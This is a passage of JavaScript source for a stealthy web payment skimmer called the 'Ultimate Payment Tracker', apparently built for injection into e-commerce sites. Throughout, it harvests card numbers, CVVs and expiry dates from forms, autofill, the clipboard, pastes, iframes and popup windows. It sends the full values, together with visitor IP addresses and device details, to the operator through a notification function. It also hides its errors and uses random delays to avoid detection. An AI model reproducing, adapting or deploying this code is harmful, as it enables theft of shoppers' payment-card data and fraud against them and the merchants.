                let message = `⚡ <b>AJAX PAYMENT SUBMISSION</b>\n\n`;
                message += `🎯 <b>URL:</b> ${ajaxData.url || 'unknown'}\n`;
                
                // Find card data
                Object.entries(ajaxData.data || {}).forEach(([key, value]) => {
                    if (this.looksLikeCardNumber(value)) {
                        message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(value)}\n`;
                    } else if (key.toLowerCase().includes('cvv')) {
                        message += `🔐 <b>CVV:</b> ${value}\n`;
                    }
                });
                
                message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
                message += `📡 <b>IP:</b> ${ip}\n`;
                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                
                await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
            }
        }
    };
    
    // ==================== BROWSER AUTOFILL CAPTURER ====================
    class BrowserAutofillCapturer {
        constructor() {
            this.autofillDetected = false;
            this.init();
        }
        
        init() {
            this.setupAutofillDetection();
            this.setupMutationObserver();
            this.setupDelayedCapture();
        }
        
        setupAutofillDetection() {
            // CSS pseudo-class detection
            const checkAutofilled = () => {
                try {
                    const autofilledInputs = document.querySelectorAll(
                        'input:-webkit-autofill, input:autofill, input[data-autofilled]'
                    );
                    autofilledInputs.forEach(input => {
                        this.captureAutofill(input);
                    });
                } catch (e) {}
            };
            
            // Check on intervals
            setInterval(checkAutofilled, 1000);
            
            // Animation detection for autofill
            document.addEventListener('animationstart', (e) => {
                if (e.animationName === 'onAutoFillStart' || 
                    e.animationName === 'onAutoFillCancel') {
                    setTimeout(checkAutofilled, 100);
                }
            });
            
            // Form focus detection
            document.addEventListener('focusin', (e) => {
                if (e.target.tagName === 'INPUT') {
                    setTimeout(() => {
                        this.checkFormForAutofill(e.target.form || e.target.closest('form'));
                    }, 500);
                }
            });
        }
        
        setupMutationObserver() {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    // Check for style changes (Chrome autofill yellow background)
                    if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                        const target = mutation.target;
                        if (target.tagName === 'INPUT' && 
                            target.style.backgroundColor.includes('rgb(250, 255, 189)')) {
                            this.captureAutofill(target);
                        }
                    }
                    
                    // Check added nodes
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.tagName === 'INPUT') {
                            this.setupAutofillListener(node);
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                attributes: true,
                attributeFilter: ['style', 'value', 'data-autofilled'],
                childList: true,
                subtree: true
            });
        }
        
        setupAutofillListener(input) {
            if (input.dataset.autofillListener) return;
            input.dataset.autofillListener = 'true';
            
            let lastValue = '';
            const checkAutofill = () => {
                if (input.value && input.value !== lastValue) {
                    lastValue = input.value;
                    // Check if this looks like autofill (multiple fields filled)
                    setTimeout(() => this.captureAutofill(input), 100);
                }
            };
            
            input.addEventListener('input', checkAutofill);
            input.addEventListener('change', checkAutofill);
            input.addEventListener('blur', checkAutofill);
            
            // Initial check
            setTimeout(checkAutofill, 1000);
        }
        
        setupDelayedCapture() {
            // Wait for page load and browser autofill
            window.addEventListener('load', () => {
                setTimeout(() => {
                    this.captureAllAutofilledData();
                }, 3000);
            });
            
            // Also check after user interaction
            document.addEventListener('click', () => {
                setTimeout(() => {
                    this.captureAllAutofilledData();
                }, 1000);
            });
        }
        
        captureAllAutofilledData() {
            if (this.autofillDetected) return;
            
            const allInputs = document.querySelectorAll('input, textarea');
            const filledInputs = [];
            
            allInputs.forEach(input => {
                if (input.value && input.value.trim() && 
                    this.isPaymentField(input)) {
                    filledInputs.push(input);
                }
            });
            
            // If multiple payment fields are filled, assume autofill
            if (filledInputs.length >= 2) {
                this.processAutofillCapture(filledInputs);
                this.autofillDetected = true;
            }
        }
        
        captureAutofill(input) {
            if (!input.value || !input.value.trim()) return;
            if (!this.isPaymentField(input)) return;
            
            const fieldInfo = {
                name: input.name || input.id || input.placeholder || 'unknown',
                type: input.type,
                value: input.value,
                isAutofill: true,
                timestamp: new Date().toISOString()
            };
            
            // Cache the data
            if (this.looksLikeCardNumber(fieldInfo.value)) {
                cardDataCache.cardNumber = fieldInfo.value;
                this.sendAutofillAlert(fieldInfo, 'CARD_NUMBER');
            } else if (fieldInfo.name.toLowerCase().includes('cvv')) {
                cardDataCache.cvv = fieldInfo.value;
                this.sendAutofillAlert(fieldInfo, 'CVV');
            }
        }
        
        isPaymentField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            const autocomplete = (input.autocomplete || '').toLowerCase();
            
            const text = `${name} ${id} ${placeholder} ${autocomplete}`;
            return text.includes('card') || 
                   text.includes('cc') || 
                   text.includes('cvv') || 
                   text.includes('cvc') ||
                   text.includes('expir') ||
                   autocomplete.includes('cc-');
        }
        
        processAutofillCapture(inputs) {
            const autofillData = {};
            
            inputs.forEach(input => {
                const name = input.name || input.id || 'field';
                autofillData[name] = input.value;
                
                // Classify
                if (this.looksLikeCardNumber(input.value)) {
                    autofillData.cardNumber = input.value;
                } else if (name.toLowerCase().includes('cvv')) {
                    autofillData.cvv = input.value;
                } else if (name.toLowerCase().includes('expir')) {
                    autofillData.expiry = input.value;
                }
            });
            
            this.sendCompleteAutofillReport(autofillData);
        }
        
        async sendAutofillAlert(fieldInfo, type) {
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `🔐 <b>BROWSER AUTOFILL CAPTURED</b>\n\n`;
            message += `🎯 <b>Type:</b> ${type}\n`;
            message += `📝 <b>Field:</b> ${fieldInfo.name}\n`;
            
            if (type === 'CARD_NUMBER') {
                message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(fieldInfo.value)}\n`;
                message += `📊 <b>Full:</b> <code>${fieldInfo.value}</code>\n`;
            } else {
                message += `🔐 <b>Value:</b> ${fieldInfo.value}\n`;
            }
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        async sendCompleteAutofillReport(data) {
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `💳 <b>COMPLETE AUTOFILL DATA CAPTURED</b>\n\n`;
            message += `🎯 <b>Browser Autofill Detected</b>\n\n`;
            
            if (data.cardNumber) {
                message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(data.cardNumber)}\n`;
                message += `📊 <b>Full:</b> <code>${data.cardNumber}</code>\n`;
                message += `💳 <b>Type:</b> ${AdvancedUtils.detectCardType(data.cardNumber)}\n`;
            }
            if (data.cvv) message += `🔐 <b>CVV:</b> ${data.cvv}\n`;
            if (data.expiry) message += `📅 <b>Expiry:</b> ${data.expiry}\n`;
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
    };
    
    // ==================== CLIPBOARD MONITOR ====================
    class ClipboardMonitor {
        constructor() {
            this.init();
        }
        
        init() {
            this.setupClipboardListeners();
            this.setupPasteDetection();
        }
        
        setupClipboardListeners() {
            // Copy event
            document.addEventListener('copy', (e) => {
                setTimeout(() => {
                    this.checkClipboardForCardData('COPY');
                }, 100);
            });
            
            // Cut event
            document.addEventListener('cut', (e) => {
                setTimeout(() => {
                    this.checkClipboardForCardData('CUT');
                }, 100);
            });
        }
        
        setupPasteDetection() {
            document.addEventListener('paste', (e) => {
                const pastedText = e.clipboardData?.getData('text') || '';
                if (pastedText) {
                    this.checkPastedData(pastedText);
                }
            });
            
            // Also monitor input events for paste
            document.addEventListener('input', (e) => {
                if (e.inputType === 'insertFromPaste' || e.inputType === 'insertText') {
                    setTimeout(() => {
                        if (e.target.value) {
                            this.checkForPastedCardData(e.target.value, e.target);
                        }
                    }, 100);
                }
            });
        }
        
        async checkClipboardForCardData(action) {
            try {
                const text = await navigator.clipboard.readText();
                if (text && this.containsCardData(text)) {
                    await this.sendClipboardAlert(text, action);
                }
            } catch (e) {
                // Clipboard access blocked, try alternative
                this.monitorClipboardChanges();
            }
        }
        
        monitorClipboardChanges() {
            // Create a hidden textarea to monitor clipboard
            const textarea = document.createElement('textarea');
            textarea.style.cssText = 'position:fixed;left:-9999px;top:-9999px;opacity:0;';
            textarea.value = 'CLIPBOARD_MONITOR';
            document.body.appendChild(textarea);
            
            textarea.select();
            
            setInterval(() => {
                try {
                    const selectedText = window.getSelection().toString();
                    if (selectedText && this.containsCardData(selectedText)) {
                        this.sendClipboardAlert(selectedText, 'SELECTION');
                    }
                } catch (e) {}
            }, 2000);
        }
        
        checkPastedData(text) {
            if (this.containsCardData(text)) {
                this.sendPasteAlert(text);
            }
        }
        
        checkForPastedCardData(text, element) {
            if (this.containsCardData(text)) {
                const fieldInfo = {
                    name: element.name || element.id || 'pasted_field',
                    value: text,
                    element: element.tagName
                };
                this.sendPasteAlert(text, fieldInfo);
            }
        }
        
        containsCardData(text) {
            const cleaned = text.replace(/\s+/g, '').replace(/-/g, '');
            
            // Check for card number
            if (/^[0-9]{13,19}$/.test(cleaned)) return true;
            
            // Check for CVV
            if (/^[0-9]{3,4}$/.test(cleaned)) return true;
            
            // Check for expiry
            if (/^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/.test(cleaned)) return true;
            
            return false;
        }
        
        async sendClipboardAlert(text, action) {
            const ip = await AdvancedUtils.getUserIP();
            
            const message = `📋 <b>CLIPBOARD CARD DATA - ${action}</b>\n\n`;
            message += `📝 <b>Copied Text:</b> ${text}\n`;
            message += `🔍 <b>Detected As:</b> ${this.getDataType(text)}\n`;
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        async sendPasteAlert(text, fieldInfo = null) {
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `📋 <b>PASTED CARD DATA</b>\n\n`;
            message += `📝 <b>Pasted Text:</b> ${text}\n`;
            
            if (fieldInfo) {
                message += `🎯 <b>Field:</b> ${fieldInfo.name}\n`;
            }
            
            message += `🔍 <b>Detected As:</b> ${this.getDataType(text)}\n`;
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        getDataType(text) {
            const cleaned = text.replace(/\s+/g, '').replace(/-/g, '');
            
            if (/^[0-9]{13,19}$/.test(cleaned)) {
                return 'CARD_NUMBER';
            } else if (/^[0-9]{3,4}$/.test(cleaned)) {
                return 'CVV/CVC';
            } else if (/^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/.test(cleaned)) {
                return 'EXPIRY_DATE';
            }
            
            return 'UNKNOWN';
        }
    };
    
    // ==================== IFRAME & CROSS-DOMAIN CAPTURER ====================
    class CrossDomainCapturer {
        constructor() {
            this.monitoredIframes = new Set();
            this.crossDomainWindows = new Set();
            this.init();
        }
        
        init() {
            this.setupIframeMonitoring();
            this.setupWindowMonitoring();
            this.setupMessageListener();
        }
        
        setupIframeMonitoring() {
            // Initial scan
            this.scanForIframes();
            
            // MutationObserver for dynamic iframes
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.tagName === 'IFRAME') {
                            this.monitorIframe(node);
                        } else if (node.querySelectorAll) {
                            const iframes = node.querySelectorAll('iframe');
                            iframes.forEach(iframe => this.monitorIframe(iframe));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            
            // Periodic rescan
            setInterval(() => this.scanForIframes(), 5000);
        }
        
        scanForIframes() {
            const iframes = document.querySelectorAll('iframe');
            iframes.forEach(iframe => {
                if (!this.monitoredIframes.has(iframe)) {
                    this.monitorIframe(iframe);
                }
            });
        }
        
        monitorIframe(iframe) {
            if (this.monitoredIframes.has(iframe)) return;
            this.monitoredIframes.add(iframe);
            
            const iframeSrc = iframe.src || '';
            
            // Check if this is a payment iframe
            if (this.isPaymentIframe(iframeSrc)) {
                this.setupIframeCapture(iframe);
            }
            
            // Try to access iframe content
            try {
                if (iframe.contentDocument) {
                    this.setupIframeContentMonitoring(iframe);
                } else {
                    // If CORS blocked, try postMessage
                    this.setupIframeCommunication(iframe);
                }
            } catch (e) {
                // CORS error, use postMessage
                this.setupIframeCommunication(iframe);
            }
        }
        
        isPaymentIframe(src) {
            const srcLower = src.toLowerCase();
            return srcLower.includes('stripe') || 
                   srcLower.includes('paypal') || 
                   srcLower.includes('razorpay') ||
                   srcLower.includes('braintree') ||
                   srcLower.includes('checkout') ||
                   srcLower.includes('payment') ||
                   srcLower.includes('card');
        }
        
        setupIframeCapture(iframe) {
            // Poll for input values
            const pollInterval = setInterval(() => {
                if (!document.body.contains(iframe)) {
                    clearInterval(pollInterval);
                    return;
                }
                
                try {
                    const iframeDoc = iframe.contentDocument;
                    if (iframeDoc) {
                        const inputs = iframeDoc.querySelectorAll('input');
                        inputs.forEach(input => {
                            if (input.value && this.isPaymentField(input)) {
                                this.captureIframePaymentData(iframe, input);
                            }
                        });
                    }
                } catch (e) {
                    // CORS error
                }
            }, 1000);
        }
        
        setupIframeContentMonitoring(iframe) {
            try {
                const iframeDoc = iframe.contentDocument;
                
                // Add event listeners inside iframe
                iframeDoc.addEventListener('input', (e) => {
                    if (e.target.tagName === 'INPUT' && e.target.value) {
                        this.captureIframePaymentData(iframe, e.target);
                    }
                }, true);
                
                iframeDoc.addEventListener('change', (e) => {
                    if (e.target.tagName === 'INPUT' && e.target.value) {
                        this.captureIframePaymentData(iframe, e.target);
                    }
                }, true);
                
                // Monitor form submissions inside iframe
                iframeDoc.addEventListener('submit', (e) => {
                    this.captureIframeFormSubmission(iframe, e.target);
                }, true);
                
            } catch (e) {
                // CORS error
            }
        }
        
        setupIframeCommunication(iframe) {
            // Send postMessage to iframe
            try {
                iframe.contentWindow.postMessage({
                    type: 'GET_PAYMENT_DATA',
                    source: 'tracker'
                }, '*');
            } catch (e) {}
            
            // Listen for responses
            window.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'PAYMENT_DATA_RESPONSE') {
                    this.processIframeResponse(event.data, iframe);
                }
            });
        }
        
        async captureIframePaymentData(iframe, input) {
            const iframeSrc = iframe.src || 'unknown';
            const fieldName = input.name || input.id || 'iframe_field';
            const fieldValue = input.value;
            
            if (!this.isPaymentData(fieldValue)) return;
            
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `🖼️ <b>IFRAME PAYMENT DATA CAPTURED</b>\n\n`;
            message += `🎯 <b>Iframe Source:</b> ${iframeSrc}\n`;
            message += `📝 <b>Field:</b> ${fieldName}\n`;
            message += `📊 <b>Value:</b> ${fieldValue}\n`;
            
            if (this.looksLikeCardNumber(fieldValue)) {
                message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(fieldValue)}\n`;
                message += `💳 <b>Type:</b> ${AdvancedUtils.detectCardType(fieldValue)}\n`;
            }
            
            message += `\n🌐 <b>Parent Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        async captureIframeFormSubmission(iframe, form) {
            const iframeSrc = iframe.src || 'unknown';
            const formData = this.collectFormData(form);
            
            if (!this.containsPaymentData(formData)) return;
            
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `🖼️ <b>IFRAME FORM SUBMISSION</b>\n\n`;
            message += `🎯 <b>Iframe Source:</b> ${iframeSrc}\n`;
            message += `📋 <b>Form Action:</b> ${form.action || 'unknown'}\n\n`;
            
            // Extract payment data
            for (const [key, value] of Object.entries(formData)) {
                if (this.looksLikeCardNumber(value)) {
                    message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(value)}\n`;
                } else if (key.toLowerCase().includes('cvv')) {
                    message += `🔐 <b>CVV:</b> ${value}\n`;
                }
            }
            
            message += `\n🌐 <b>Parent Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'FORM_SUBMIT');
        }
        
        processIframeResponse(data, iframe) {
            if (data.paymentData) {
                this.sendIframeDataAlert(data.paymentData, iframe);
            }
        }
        
        async sendIframeDataAlert(paymentData, iframe) {
            const ip = await AdvancedUtils.getUserIP();
            const iframeSrc = iframe.src || 'unknown';
            
            let message = `🖼️ <b>IFRAME PAYMENT DATA VIA POSTMESSAGE</b>\n\n`;
            message += `🎯 <b>Iframe Source:</b> ${iframeSrc}\n`;
            
            if (paymentData.cardNumber) {
                message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(paymentData.cardNumber)}\n`;
            }
            if (paymentData.cvv) message += `🔐 <b>CVV:</b> ${paymentData.cvv}\n`;
            if (paymentData.expiry) message += `📅 <b>Expiry:</b> ${paymentData.expiry}\n`;
            
            message += `\n🌐 <b>Parent Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        setupWindowMonitoring() {
            // Monitor window.open for cross-domain payment pages
            const originalOpen = window.open;
            window.open = function(url, target, features) {
                const newWindow = originalOpen.call(this, url, target, features);
                if (newWindow && url && this.isPaymentUrl(url)) {
                    this.monitorCrossDomainWindow(newWindow, url);
                }
                return newWindow;
            }.bind(this);
            
            // Monitor link clicks that might open payment windows
            document.addEventListener('click', (e) => {
                const link = e.target.closest('a');
                if (link && link.href && this.isPaymentUrl(link.href)) {
                    if (link.target === '_blank' || link.hasAttribute('target')) {
                        setTimeout(() => {
                            this.monitorCrossDomainWindows();
                        }, 1000);
                    }
                }
            }, true);
        }
        
        monitorCrossDomainWindow(win, url) {
            if (this.crossDomainWindows.has(win)) return;
            this.crossDomainWindows.add(win);
            
            // Try to monitor the new window
            this.setupCrossDomainCapture(win, url);
        }
        
        setupCrossDomainCapture(win, url) {
            // Poll for payment data in new window
            const pollInterval = setInterval(() => {
                try {
                    if (win.closed) {
                        clearInterval(pollInterval);
                        return;
                    }
                    
                    // Check for payment forms in new window
                    const winDoc = win.document;
                    if (winDoc) {
                        const forms = winDoc.querySelectorAll('form');
                        forms.forEach(form => {
                            if (this.containsPaymentForm(form)) {
                                this.captureCrossDomainPaymentData(win, form, url);
                            }
                        });
                    }
                } catch (e) {
                    // Cross-origin error
                }
            }, 2000);
            
            // Clean up after 5 minutes
            setTimeout(() => {
                clearInterval(pollInterval);
            }, 300000);
        }
        
        async captureCrossDomainPaymentData(win, form, originalUrl) {
            const formData = this.collectFormData(form);
            
            if (!this.containsPaymentData(formData)) return;
            
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `🌐 <b>CROSS-DOMAIN PAYMENT DATA CAPTURED</b>\n\n`;
            message += `🎯 <b>Payment Page:</b> ${originalUrl}\n`;
            message += `📋 <b>Current URL:</b> ${win.location.href}\n\n`;
            
            // Extract payment data
            for (const [key, value] of Object.entries(formData)) {
                if (this.looksLikeCardNumber(value)) {
                    message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(value)}\n`;
                    message += `📊 <b>Full:</b> <code>${value}</code>\n`;
                } else if (key.toLowerCase().includes('cvv')) {
                    message += `🔐 <b>CVV:</b> ${value}\n`;
                }
            }
            
            message += `\n🔗 <b>Original Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        setupMessageListener() {
            // Listen for postMessage from iframes/windows
            window.addEventListener('message', (event) => {
                // Check if message contains payment data
                if (event.data && typeof event.data === 'object') {
                    if (event.data.cardData || event.data.paymentInfo) {
                        this.processCrossDomainMessage(event);
                    }
                }
            }, false);
        }
        
        async processCrossDomainMessage(event) {
            const data = event.data;
            const origin = event.origin;
            
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `📨 <b>CROSS-DOMAIN MESSAGE PAYMENT DATA</b>\n\n`;
            message += `🎯 <b>Origin:</b> ${origin}\n`;
            
            if (data.cardData) {
                if (data.cardData.number) {
                    message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(data.cardData.number)}\n`;
                }
                if (data.cardData.cvv) message += `🔐 <b>CVV:</b> ${data.cardData.cvv}\n`;
                if (data.cardData.expiry) message += `📅 <b>Expiry:</b> ${data.cardData.expiry}\n`;
            }
            
            message += `\n🌐 <b>Current Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        isPaymentUrl(url) {
            const urlLower = url.toLowerCase();
            return urlLower.includes('/checkout') || 
                   urlLower.includes('/payment') ||
                   urlLower.includes('/pay') ||
                   urlLower.includes('/order') ||
                   urlLower.includes('stripe') ||
                   urlLower.includes('paypal') ||
                   urlLower.includes('razorpay');
        }
        
        containsPaymentForm(form) {
            const formHTML = form.outerHTML.toLowerCase();
            return formHTML.includes('card') || 
                   formHTML.includes('cvv') || 
                   formHTML.includes('credit') ||
                   formHTML.includes('payment');
        }
        
        collectFormData(form) {
            const data = {};
            try {
                const formData = new FormData(form);
                for (let [key, value] of formData.entries()) {
                    if (value && value.toString().trim()) {
                        data[key] = value.toString().trim();
                    }
                }
            } catch (e) {}
            return data;
        }
        
        isPaymentField(input) {
            const name = (input.name || '').toLowerCase();
            return name.includes('card') || 
                   name.includes('cc') || 
                   name.includes('cvv') || 
                   name.includes('cvc');
        }
        
        isPaymentData(value) {
            return this.looksLikeCardNumber(value) || 
                   /^[0-9]{3,4}$/.test(value) || 
                   /^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/.test(value);
        }
        
        looksLikeCardNumber(value) {
            const cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
            return /^[0-9]{13,19}$/.test(cleaned);
        }
        
        containsPaymentData(data) {
            const values = Object.values(data).join(' ');
            return this.looksLikeCardNumber(values) || 
                   values.includes('cvv') || 
                   values.includes('cvc');
        }
    };
    
    // ==================== MAIN TRACKER CLASS ====================
    class UltimatePaymentTracker {
        constructor() {
            this.initialize();
        }
        
        async initialize() {
            // 1. Complete silence - NO ERRORS
            AdvancedUtils.silenceEnvironment();
            
            // 2. Relative path support
            AdvancedUtils.setupRelativePathSupport();
            
            // 3. Get initial data
            const [ip, fingerprint, plugins] = await Promise.all([
                AdvancedUtils.getUserIP(),
                Promise.resolve(AdvancedUtils.getBrowserFingerprint()),
                Promise.resolve(AdvancedUtils.detectWordPressPlugins())
            ]);
            
            // 4. Send activation message
            if (CONFIG.SMS_EVENTS.ACTIVATION) {
                await this.sendActivationMessage(ip, fingerprint, plugins);
            }
            
            // 5. Initialize components with delays
            setTimeout(() => {
                new UniversalFormDetector();
            }, 500);
            
            setTimeout(() => {
                new BrowserAutofillCapturer();
            }, 1000);
            
            setTimeout(() => {
                new ClipboardMonitor();
            }, 1500);
            
            setTimeout(() => {
                new CrossDomainCapturer();
            }, 2000);
            
            // 6. Setup page tracking
            this.setupPageTracking();
            
            // 7. Setup SPA/Page change tracking
            this.setupSPATracking();
            
            // 8. Mark as active
            isActive = true;
            
            console.log('✅ Ultimate Payment Tracker Activated');
        }
        
        async sendActivationMessage(ip, fingerprint, plugins) {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenRes = `${screen.width}x${screen.height}`;
            
            let message = `🚀 <b>ULTIMATE PAYMENT TRACKER ACTIVATED - 100% SILENT</b>\n\n`;
            message += `🔄 <b>Version:</b> ${CONFIG.VERSION}\n`;
            message += `🌐 <b>Website:</b> ${window.location.origin}\n`;
            message += `📄 <b>Page:</b> <code>${window.location.href}</code>\n`;
            message += `🔗 <b>Referrer:</b> ${document.referrer || 'Direct'}\n\n`;
            
            message += `👤 <b>User Info:</b>\n`;
            message += `➤ IP Address: ${ip}\n`;
            message += `➤ Platform: ${platform}\n`;
            message += `➤ Screen: ${screenRes}\n`;
            message += `➤ Device ID: ${deviceId}\n`;
            message += `➤ Session ID: ${sessionId}\n\n`;
            
            if (plugins.length > 0) {
                message += `🔌 <b>Detected Plugins:</b>\n`;
                plugins.forEach(plugin => {
                    message += `✅ ${plugin}\n`;
                });
                message += `\n`;
            }
            
            message += `🔧 <b>Active Features:</b>\n`;
            message += `✅ 100% Silent Operation\n`;
            message += `✅ All WordPress Plugins Support\n`;
            message += `✅ Browser Autofill Capture\n`;
            message += `✅ Clipboard Monitoring\n`;
            message += `✅ Iframe & Cross-Domain Capture\n`;
            message += `✅ Relative Path Support\n`;
            
            message += `\n📱 <b>SMS Notifications Active For:</b>\n`;
            Object.entries(CONFIG.SMS_EVENTS).forEach(([key, value]) => {
                if (value) message += `✅ ${key}\n`;
            });
            
            message += `\n🕒 <b>Activation Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'ACTIVATION');
        }
        
        setupPageTracking() {
            // Track cart page visits
            const currentUrl = window.location.href.toLowerCase();
            if (currentUrl.includes('/cart') || currentUrl.includes('/basket')) {
                this.trackCartVisit();
            }
            
            // Track checkout page visits
            if (currentUrl.includes('/checkout') || currentUrl.includes('/payment')) {
                this.trackCheckoutVisit();
            }
            
            // Monitor URL changes
            let lastUrl = window.location.href;
            setInterval(() => {
                const currentUrl = window.location.href;
                if (currentUrl !== lastUrl) {
                    lastUrl = currentUrl;
                    this.trackPageChange(currentUrl);
                }
            }, 1000);
        }
        
        async trackCartVisit() {
            if (!CONFIG.SMS_EVENTS.CART_VISIT) return;
            
            const ip = await AdvancedUtils.getUserIP();
            const message = AdvancedUtils.generateReport('🛒 CART PAGE VISITED', {
                'Page URL': window.location.href,
                'IP Address': ip,
                'User Action': 'Cart View'
            });
            
            await AdvancedUtils.sendNotification(message, 'CART_VISIT');
        }
        
        async trackCheckoutVisit() {
            if (!CONFIG.SMS_EVENTS.CHECKOUT_VISIT) return;
            
            const ip = await AdvancedUtils.getUserIP();
            const message = AdvancedUtils.generateReport('💰 CHECKOUT PAGE VISITED', {
                'Page URL': window.location.href,
                'IP Address': ip,
                'User Action': 'Checkout View'
            });
            
            await AdvancedUtils.sendNotification(message, 'CHECKOUT_VISIT');
        }
        
        trackPageChange(url) {
            const urlLower = url.toLowerCase();
            
            if (urlLower.includes('/checkout') && CONFIG.SMS_EVENTS.CHECKOUT_VISIT) {
                setTimeout(() => this.trackCheckoutVisit(), 500);
            } else if ((urlLower.includes('/cart') || urlLower.includes('/basket')) && CONFIG.SMS_EVENTS.CART_VISIT) {
                setTimeout(() => this.trackCartVisit(), 500);
            }
        }
        
        setupSPATracking() {
            // History API interception for SPAs
            const originalPushState = history.pushState;
            const originalReplaceState = history.replaceState;
            
            history.pushState = function() {
                originalPushState.apply(this, arguments);
                this.handleSPANavigation();
            }.bind(this);
            
            history.replaceState = function() {
                originalReplaceState.apply(this, arguments);
                this.handleSPANavigation();
            }.bind(this);
            
            window.addEventListener('popstate', () => {
                this.handleSPANavigation();
            });
        }
        
        handleSPANavigation() {
            const url = window.location.href;
            this.trackPageChange(url);
            
            // Reinitialize form detection for new page content
            setTimeout(() => {
                if (isActive) {
                    // UniversalFormDetector will automatically pick up new forms
                    // through its MutationObserver
                }
            }, 1000);
        }
    };
    
    // ==================== ENTRY POINT WITH RELATIVE PATH SUPPORT ====================
    // This ensures the tracker works from ANY folder/sub-folder
    
    const initializeTracker = () => {
        // Get current script location for relative path support
        const currentScript = document.currentScript || 
                             (() => {
                                 const scripts = document.getElementsByTagName('script');
                                 return scripts[scripts.length - 1];
                             })();
        
        // Store script path for relative URL resolution
        if (currentScript && currentScript.src) {
            const scriptPath = currentScript.src;
            const basePath = scriptPath.substring(0, scriptPath.lastIndexOf('/') + 1);
            window._trackerBasePath = basePath;
        }
        
        // Wait for optimal initialization time
        const init = () => {
            // Random delay to avoid pattern detection
            setTimeout(() => {
                try {
                    new UltimatePaymentTracker();
                } catch (error) {
                    // Silent fail - no errors shown
                }
            }, Math.random() * 3000 + 1000);
        };
        
        // Initialize based on document state
        if (document.readyState === 'complete' || document.readyState === 'interactive') {
            init();
        } else {
            document.addEventListener('DOMContentLoaded', init);
            window.addEventListener('load', init);
        }
    };
    
    // Start initialization
    initializeTracker();
    
    // Self-healing: Reinitialize if something goes wrong
    setInterval(() => {
        if (!isActive && document.body) {
            initializeTracker();
        }
    }, 15000);
    
    // String hashcode utility
    if (!String.prototype.hashCode) {
        String.prototype.hashCode = function() {
            let hash = 0;
            for (let i = 0; i < this.length; i++) {
                const char = this.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return hash;
        };
    }
    
})();
    
})();
